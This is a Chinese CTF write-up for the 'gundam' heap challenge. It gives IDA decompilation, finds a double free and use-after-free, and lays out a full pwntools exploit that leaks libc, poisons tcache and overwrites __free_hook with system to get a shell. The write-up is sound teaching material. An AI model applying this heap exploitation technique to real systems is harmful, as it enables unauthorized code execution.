IDA分析

main()函数

void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  char buf[10]; // [rsp+Eh] [rbp-12h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  sub_1022(a1, a2, a3);
  while ( 1 )
  {
    menu();
    read(0, buf, 8uLL);
    switch ( atoi(buf) )
    {
      case 1:
        add();
        break;
      case 2:
        show();
        break;
      case 3:
        del();
        break;
      case 4:
        sub_E22();
        break;
      case 5:
        puts("Exit....");
        exit(0);
      default:
        puts("Invalid choice");
        break;
    }
  }
}

add()函数

  int v1; // [rsp+0h] [rbp-20h] BYREF
  unsigned int i; // [rsp+4h] [rbp-1Ch]
  void *s; // [rsp+8h] [rbp-18h]
  void *buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);

  buf = 0LL;
  if ( dword_20208C <= 8 )
  {
    s = malloc(0x28uLL);

分析add函数可得gundam结构体

struct gundam{
    uint32_t flag;
    char *name;
    char type[24];
}gundam;
struct gundam *factory[9];

gundam->name指向一块0x100大小的空间。

show()函数

__int64 sub_EF4()
{
  unsigned int i; // [rsp+4h] [rbp-Ch]

  if ( dword_20208C )
  {
    for ( i = 0; i <= 8; ++i )
    {
      if ( qword_2020A0[i] && *qword_2020A0[i] )
      {
        printf("\nGundam[%u] :%s", i, *(qword_2020A0[i] + 8LL));
        printf("Type[%u] :%s\n", i, (qword_2020A0[i] + 16LL));
      }
    }
  }
  else
  {
    puts("No gundam produced!");
  }
  return 0LL;
}

首先判断gundam的数量是否为0，如果不是，根据factory[i]和factory[i]->flag判断某个gundam是否存在，若存在，就将它的name和type打印出来。

del函数

__int64 sub_D32()
{
  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  if ( dword_20208C )
  {
    printf("Which gundam do you want to Destory:");
    __isoc99_scanf("%d", &v1);
    if ( v1 > 8 || !qword_2020A0[v1] )
    {
      puts("Invalid choice");
      return 0LL;
    }
    *qword_2020A0[v1] = 0;
    free(*(qword_2020A0[v1] + 8LL));
  }
  else
  {
    puts("No gundam");
  }
  return 0LL;
}

该函数通过factory[i]判断某个gundam是否存在，并factory[i]->flag为0，但在删除gundam后没有将factory[i]置空，这会导致factory[i]->name 可能多次释放，且name指针也没有置空，可能会导致UAF漏洞

blow up函数

unsigned __int64 sub_E22()
{
  unsigned int i; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  for ( i = 0; i <= 8; ++i )
  {
    if ( qword_2020A0[i] && !*qword_2020A0[i] )
    {
      free(qword_2020A0[i]);
      qword_2020A0[i] = 0LL;
      --dword_20208C;
    }
  }
  puts("Done!");
  return __readfsqword(0x28u) ^ v2;
}

blow up函数会找到所以factory[i]不为0，但是factory[i]->flag为0的gundam，然后将其结构体释放，并把factory[i]置为0，没释放一次，记录数量的变量指就减1，但是name指针仍然存在。

漏洞利用

  • 利用被放入unsorted bin中的chunk 泄露libc基址，首先先释放7个gundam填满tcache ，然后将第8个gundam释放，就能进入unsorted bin，然后再把这8个gundam申请回来，但是，gundam->name这块chunk的内容没有变化，我们可以利用这个来泄露libc
  • 然后我们将同一个chunk两次放入tcache bin中，修改next指针制造tcache poisoning，&free_hook 的 地 方 分 配 chunk ， 进 而 修 改 free_hook 为system。由于tcache并未对二次释放做检查，因此直接释放两次即可；

首先填满tcache

接下来释放gundam 7（即第8个gundam），即可进入unsorted bin中

接下来用blow up 清空factory[i]并置0，且记录数量的变量指就减1

接下来把这8个gundam都申请回来，由于没有对factory[i]->name chunk作清空操作，我们可以从中泄露出libc地址

接下来触发二次释放漏洞

接下来申请一个gundam（gundam 0）修改fd为__free_hook

再次申请一个gundam （gundam 1）并向其中写入”/bin/sh\x00”字符串

在申请一个gundam（gundam2），就可申请到__free_hook,我们修改其为system的地址，然后删除gundam1即可getshell

exp

如果连接 buu的话，需要把libc文件换成 libc-2.27.so ，main_arean=u64(p.recvuntil("Type[7]", drop=True)[-6:].ljust(8, '\x00'))-88后面减去的88需换成96，libc_base=main_arean-0x3DAC20，0x3DAC20需换成0x3EBC40

from pwn import*
#p=remote('node4.buuoj.cn',29230)

p=process('./gundam')
libc=ELF('./libc-2.26.so')
#context.log_level='debug'
def add(name):
    p.sendlineafter("choice : ", '1')
    p.sendlineafter("gundam :", name) 
    p.sendlineafter("gundam :", '0')
def visit():
    p.recvuntil('Your choice : ')
    p.sendline(str(2))

def destory(index):
    p.recvuntil('Your choice : ')
    p.sendline(str(3))
    p.recvuntil('Which gundam do you want to Destory:')
    p.sendline(str(index))

def blow_up():
    p.recvuntil('Your choice : ')
    p.sendline(str(4))


for i in range(9):
    add('aaaa')
for i in range(8):
    destory(i)
blow_up()
for i in range(7):
    add('bbbb')
add('c'*7)
visit()

main_arean=u64(p.recvuntil("Type[7]", drop=True)[-6:].ljust(8, '\x00'))-88
print('main_arean:',hex(main_arean))

libc_base=main_arean-0x3DAC20
free_hook=libc_base+libc.sym['__free_hook']
sys=libc_base+libc.sym['system']


destory(2)
destory(1)
destory(0)
destory(0)

blow_up()

add(p64(free_hook))  #0

add(b'/bin/sh\x00')   #1

print('sys:',hex(sys))

add(p64(sys))        #2

destory(0)
p.interactive()
